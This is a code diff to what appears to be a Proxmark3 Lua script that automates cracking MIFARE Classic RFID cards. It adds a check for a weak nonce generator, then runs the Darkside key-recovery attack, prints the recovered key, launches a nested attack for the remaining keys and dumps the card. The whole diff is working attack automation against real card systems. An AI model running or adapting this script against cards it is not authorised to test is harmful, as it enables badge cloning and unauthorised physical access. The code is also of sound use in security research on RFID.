@@ -26,25 +26,23 @@ Output files from this operation:
 -- Some utilities 
 -------------------------------
 local DEBUG = false
-local MIFARE_AUTH_KEYA = 0x60
-local MIFARE_AUTH_KEYB = 0x61
 --- 
 -- A debug printout-function
-function dbg(args)
+local function dbg(args)
 	if DEBUG then
 		print(":: ", args)
 	end
 end 
 --- 
 -- This is only meant to be used when errors occur
-function oops(err)
+local function oops(err)
 	print("ERROR: ",err)
 	return nil,err
 end
 
 --- 
 -- Usage help
-function help()
+local function help()
 	print(desc)
 	print("Example usage")
 	print(example)
@@ -54,7 +52,7 @@ end
 -- Waits for a mifare card to be placed within the vicinity of the reader. 
 -- @return if successfull: an table containing card info
 -- @return if unsuccessfull : nil, error
-function wait_for_mifare()
+local function wait_for_mifare()
 	while not core.ukbhit() do
 		res, err = reader.read1443a()
 		if res then return res end
@@ -63,7 +61,7 @@ function wait_for_mifare()
 	return nil, "Aborted by user"
 end
 
-function nested(key,sak)
+local function nested(key,sak)
 	local typ = 1
 	if 0x18 == sak then --NXP MIFARE Classic 4k | Plus 4k | Ev1 4k
 		typ = 4
@@ -82,7 +80,7 @@ function nested(key,sak)
 	core.console(cmd)
 end
 
-function dump(uid)
+local function dump(uid)
 	core.console("hf mf dump")
 	-- Save the global args, those are *our* arguments
 	local myargs = args
@@ -97,10 +95,22 @@ function dump(uid)
 	-- Set back args. Not that it's used, just for the karma... 
 	args = myargs
 end
+--
+-- performs a test if tag nonce uses weak or hardend prng
+local function perform_prng_test()
 
+	local isweak = core.detect_prng()
+	if isweak == 1 then
+		dbg('PRNG detection : WEAK nonce detected')
+		return true
+	end
+
+	dbg('PRNG detection : HARDEND nonce detected')
+	return false
+end
 --- 
 -- The main entry point
-function main(args)
+local function main(args)
 
 	local verbose, exit, res, uid, err, _, sak
 	local seen_uids = {}
@@ -121,33 +131,40 @@ function main(args)
 		-- Seen already?
 		uid = res.uid
 		sak = res.sak
+		
+
+		
 		if not seen_uids[uid] then
 			-- Store it
 			seen_uids[uid] = uid
-			print("Card found, commencing crack on UID", uid)
-			-- Crack it
-			local key, cnt
-			err, res = core.mfDarkside()
-			if     err == -1 then return oops("Button pressed. Aborted.") 
-			elseif err == -2 then return oops("Card is not vulnerable to Darkside attack (doesn't send NACK on authentication requests).")
-			elseif err == -3 then return oops("Card is not vulnerable to Darkside attack (its random number generator is not predictable).")
-			elseif err == -4 then return oops([[
-Card is not vulnerable to Darkside attack (its random number generator seems to be based on the wellknown
-generating polynomial with 16 effective bits only, but shows unexpected behaviour.]])
-			elseif err == -5 then return oops("Aborted via keyboard.")
-			end
-			-- The key is actually 8 bytes, so a 
-			-- 6-byte key is sent as 00XXXXXX
-			-- This means we unpack it as first
-			-- two bytes, then six bytes actual key data
-			-- We can discard first and second return values
-			_,_,key = bin.unpack("H2H6",res)
-			print("Found valid key: "..key);
+			
+			-- check if PRNG is WEAK
+			if perform_prng_test() then  
+				print("Card found, commencing crack on UID", uid)
+				-- Crack it
+				local key, cnt
+				err, res = core.mfDarkside()
+				if     err == -1 then return oops("Button pressed. Aborted.") 
+				elseif err == -2 then return oops("Card is not vulnerable to Darkside attack (doesn't send NACK on authentication requests).")
+				elseif err == -3 then return oops("Card is not vulnerable to Darkside attack (its random number generator is not predictable).")
+				elseif err == -4 then return oops([[
+	Card is not vulnerable to Darkside attack (its random number generator seems to be based on the wellknown
+	generating polynomial with 16 effective bits only, but shows unexpected behaviour.]])
+				elseif err == -5 then return oops("Aborted via keyboard.")
+				end
+				-- The key is actually 8 bytes, so a 
+				-- 6-byte key is sent as 00XXXXXX
+				-- This means we unpack it as first
+				-- two bytes, then six bytes actual key data
+				-- We can discard first and second return values
+				_,_,key = bin.unpack("H2H6",res)
+				print("Found valid key: "..key);
 
-			-- Use nested attack
-			nested(key,sak)
-			-- Dump info
-			dump(uid)
+				-- Use nested attack
+				nested(key,sak)
+				-- Dump info
+				dump(uid)
+			end
 			print_message = true
 		end
 	end
